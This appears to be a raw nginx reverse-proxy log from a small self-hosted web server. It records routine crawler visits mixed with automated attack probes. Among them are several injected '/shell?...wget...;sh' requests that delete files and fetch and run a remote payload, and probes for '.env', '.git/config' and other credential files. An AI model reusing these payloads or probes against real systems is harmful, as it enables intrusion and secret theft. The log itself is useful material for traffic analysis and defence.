[36mwebsites-www_mrpancho-1  | [0m/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 143.110.222.166 - - [06/Mar/2023:10:19:55 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m127.0.0.1 103.173.157.220 - - [06/Mar/2023:10:26:27 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+botbet.catbbos.fun/jaws;sh+/tmp/jaws HTTP/1.1" 503 190 "-" "Hello, world" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 51.222.253.11 - - [06/Mar/2023:10:32:58 +0000] "GET /robots.txt HTTP/2.0" 404 153 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 51.222.253.15 - - [06/Mar/2023:10:32:59 +0000] "GET / HTTP/2.0" 200 7134 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 51.222.253.7 - - [06/Mar/2023:10:33:02 +0000] "GET /bundle.min.js HTTP/2.0" 200 178772 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 172.23.0.1 - - [06/Mar/2023:10:49:43 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 172.23.0.1 - - [06/Mar/2023:10:49:43 +0000] "GET / HTTP/2.0" 200 7134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m127.0.0.1 183.245.33.215 - - [06/Mar/2023:11:11:08 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 503 190 "-" "Hello, world" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 143.110.222.166 - - [06/Mar/2023:11:20:55 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 185.151.242.216 - - [06/Mar/2023:11:26:03 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00\x03\x00\x01\xD6" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 185.254.196.223 - - [06/Mar/2023:11:32:40 +0000] "GET /.env HTTP/1.1" 503 592 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 185.254.196.223 - - [06/Mar/2023:11:32:41 +0000] "POST / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 89.248.165.84 - - [06/Mar/2023:11:43:21 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 89.248.165.84 - - [06/Mar/2023:11:44:36 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0msparrow.cloudflare.com 104.28.195.187 - - [06/Mar/2023:11:45:29 +0000] "GET / HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 20.9.57.77 - - [06/Mar/2023:11:48:57 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 zgrab/0.x" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 20.119.235.87 - - [06/Mar/2023:11:51:10 +0000] "GET /.env HTTP/1.1" 503 190 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 20.119.235.87 - - [06/Mar/2023:11:51:10 +0000] "POST / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 20.119.235.87 - - [06/Mar/2023:11:51:10 +0000] "GET /.env HTTP/1.1" 503 190 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 20.119.235.87 - - [06/Mar/2023:11:51:10 +0000] "POST / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 20.119.235.87 - - [06/Mar/2023:11:51:11 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 503 190 "-" "python-requests/2.28.2" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 107.170.249.22 - - [06/Mar/2023:11:55:47 +0000] "GET /actuator/health HTTP/1.1" 503 190 "-" "Mozilla/5.0 zgrab/0.x" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 143.110.222.166 - - [06/Mar/2023:12:19:58 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 71.6.232.25 - - [06/Mar/2023:12:27:45 +0000] "GET / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 14.29.140.161 - - [06/Mar/2023:12:32:11 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 45.56.108.128 - - [06/Mar/2023:12:43:29 +0000] "GET /JxBX HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 193.118.53.138 - - [06/Mar/2023:12:47:02 +0000] "GET / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m[2600:3c00::f03c:93ff:fe41:4fdf] 172.23.0.1 - - [06/Mar/2023:12:58:26 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m[2600:3c00::f03c:93ff:fe41:4fdf] 172.23.0.1 - - [06/Mar/2023:13:05:44 +0000] "GET /favicon.ico HTTP/1.1" 503 592 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m[2600:3c00::f03c:93ff:fe41:4fdf] 172.23.0.1 - - [06/Mar/2023:13:05:59 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m127.0.0.1 103.173.156.252 - - [06/Mar/2023:13:06:05 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+botbet.catbbos.fun/jaws;sh+/tmp/jaws HTTP/1.1" 503 190 "-" "Hello, world" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 185.56.80.40 - - [06/Mar/2023:13:14:36 +0000] "GET /.env HTTP/1.1" 503 190 "-" "Mozilla/5.0 zgrab/0.x" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 119.61.0.141 - - [06/Mar/2023:13:15:07 +0000] "GET / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 119.61.0.141 - - [06/Mar/2023:13:15:08 +0000] "GET / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mdavidbriseno.com 172.23.0.1 - - [06/Mar/2023:13:20:58 +0000] "GET / HTTP/1.1" 301 169 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mdavidbriseno.com 172.23.0.1 - - [06/Mar/2023:13:20:58 +0000] "HEAD / HTTP/1.1" 301 0 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mdavidbriseno.com 172.23.0.1 - - [06/Mar/2023:13:20:58 +0000] "HEAD / HTTP/1.1" 206 0 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mdavidbriseno.com 172.23.0.1 - - [06/Mar/2023:13:20:58 +0000] "GET / HTTP/1.1" 206 742 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 45.56.108.128 - - [06/Mar/2023:13:21:15 +0000] "GET /JxBX HTTP/1.1" 503 592 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 143.110.222.166 - - [06/Mar/2023:13:22:41 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 45.61.188.225 - - [06/Mar/2023:13:26:05 +0000] "GET / HTTP/1.1" 503 190 "-" "Linux Gnu (cow)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 45.79.181.94 - - [06/Mar/2023:13:34:22 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xD4v\x89'\xEF\xF6\xE0\xEE\x1FvP\xDBF\xB97h\xC2L\xE4<SR;\xEDm\x7FX)\xFB/_G\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 20.55.53.144 - - [06/Mar/2023:13:42:08 +0000] "\xCB\x11\xA2!\x22X\x1F\x92K\xB4\xD3\x16\xD5\x81\x03\x8F\xB4\xEA\x96F\xF4q" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 184.105.247.194 - - [06/Mar/2023:13:54:03 +0000] "GET / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:18 +0000] "GET / HTTP/1.1" 503 190 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 139.144.150.8 - - [06/Mar/2023:13:59:18 +0000] "HELP" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /server-status HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /info.php HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA78907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.7586.98 Mobile Safari/537.3" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /.git/config HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /s/7313e2032313e26353e25343/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /.vscode/sftp.json HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /telescope/requests HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /.DS_Store HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /.env HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:20 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:21 +0000] "GET /api/search?folderIds=0 HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:21 +0000] "GET /config.json HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:21 +0000] "GET /about HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:21 +0000] "GET /v2/_catalog HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 139.144.150.8 - - [06/Mar/2023:13:59:21 +0000] "GET /login.action HTTP/1.1" 503 190 "-" "Go-http-client/1.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 34.223.100.86 - - [06/Mar/2023:14:02:30 +0000] "GET /.git/config HTTP/1.1" 503 190 "-" "python-requests/2.28.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 184.105.247.194 - - [06/Mar/2023:14:03:40 +0000] "GET /favicon.ico HTTP/1.1" 503 190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 184.105.247.194 - - [06/Mar/2023:14:06:54 +0000] "GET / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 184.105.247.194 - - [06/Mar/2023:14:09:02 +0000] "GET /geoserver/web/ HTTP/1.1" 400 248 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 184.105.247.194 - - [06/Mar/2023:14:09:30 +0000] "GET /.git/config HTTP/1.1" 503 190 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 143.110.222.166 - - [06/Mar/2023:14:21:59 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 185.254.196.223 - - [06/Mar/2023:14:33:44 +0000] "GET /.env HTTP/1.1" 503 592 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 185.254.196.223 - - [06/Mar/2023:14:33:44 +0000] "POST / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 66.240.236.116 - - [06/Mar/2023:14:57:42 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 zgrab/0.x" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0;31;1m2023/03/06 15:01:50 [warn] 61#61: no resolver defined to resolve r3.o.lencr.org while requesting certificate status, responder: r3.o.lencr.org, certificate: "/etc/nginx/certs/www.davidbriseno.com.crt"
[34mwebsites-nginx-proxy-1    | [0m[0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 144.217.135.194 - - [06/Mar/2023:15:01:50 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; Dataprovider.com)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 144.217.135.194 - - [06/Mar/2023:15:01:50 +0000] "GET / HTTP/1.1" 200 742 "-" "Mozilla/5.0 (compatible; Dataprovider.com)" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 144.217.135.194 - - [06/Mar/2023:15:01:50 +0000] "GET /robots.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Dataprovider.com)" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 144.217.135.194 - - [06/Mar/2023:15:01:50 +0000] "GET /sitemap.xml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Dataprovider.com)" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 144.217.135.194 - - [06/Mar/2023:15:01:50 +0000] "GET /ads.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; Dataprovider.com)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 144.217.135.194 - - [06/Mar/2023:15:01:50 +0000] "GET /ads.txt HTTP/1.1" 404 153 "http://www.davidbriseno.com/ads.txt" "Mozilla/5.0 (compatible; Dataprovider.com)" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 144.217.135.194 - - [06/Mar/2023:15:01:51 +0000] "GET / HTTP/1.1" 200 742 "-" "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 149.56.150.32 - - [06/Mar/2023:15:02:39 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; Dataprovider.com)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 149.56.150.32 - - [06/Mar/2023:15:02:40 +0000] "GET / HTTP/2.0" 200 742 "-" "Mozilla/5.0 (compatible; Dataprovider.com)" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 123.60.146.214 - - [06/Mar/2023:15:07:50 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 8.8; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3116.88 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.davidbriseno.com 123.60.146.214 - - [06/Mar/2023:15:07:50 +0000] "GET / HTTP/1.1" 200 742 "-" "Mozilla/5.0 (Windows NT 8.8; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3116.88 Safari/537.36" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 66.240.205.34 - - [06/Mar/2023:15:14:04 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m127.0.0.1 45.33.120.103 - - [06/Mar/2023:15:19:29 +0000] "GET /v1/agent/self HTTP/1.1" 503 190 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmrpancho.xyz 162.214.112.108 - - [06/Mar/2023:15:22:25 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0" "172.23.0.5:80"
